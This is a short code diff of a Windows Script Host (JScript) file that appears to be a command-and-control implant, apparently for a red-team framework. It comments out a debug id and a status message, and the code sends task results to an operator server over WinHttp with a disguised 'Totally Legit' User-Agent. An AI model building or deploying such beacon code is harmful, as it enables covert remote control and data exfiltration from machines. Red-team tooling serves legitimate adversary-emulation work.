@@ -7,7 +7,7 @@ var guid = (TypeLib.Guid).replace('{', '').replace('}', '');
 var myGuid = guid.substring(1,guid.length-2);
 
 //Debug Hardcode id
-myGuid = "ACDC";
+//myGuid = "ACDC";
 
 //TODO: Add Range variable, etc...
 
@@ -38,7 +38,7 @@ function postText(strURL, json_data)
     {
         // Create the WinHTTPRequest ActiveX Object.
         var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-	//WinHttpReq.SetProxy( 2, "127.0.0.1:8888", "" );
+		//WinHttpReq.SetProxy( 2, "127.0.0.1:8888", "" );
         //  Create an HTTP request. 
         var temp = WinHttpReq.Open("POST", strURL, false);  
 		WinHttpReq.SetRequestHeader("User-Agent", "Totally Legit");
@@ -133,7 +133,7 @@ function parse_Execute(task)
 	WScript.StdOut.WriteLine(JSONResponse);
 	WScript.StdIn.ReadLine();
 	*/
-	Wscript.StdOut.WriteLine(" Sending Back Task Results ");
+	
 	postText(prelude_operator_server, JSONResponse);
 }
 
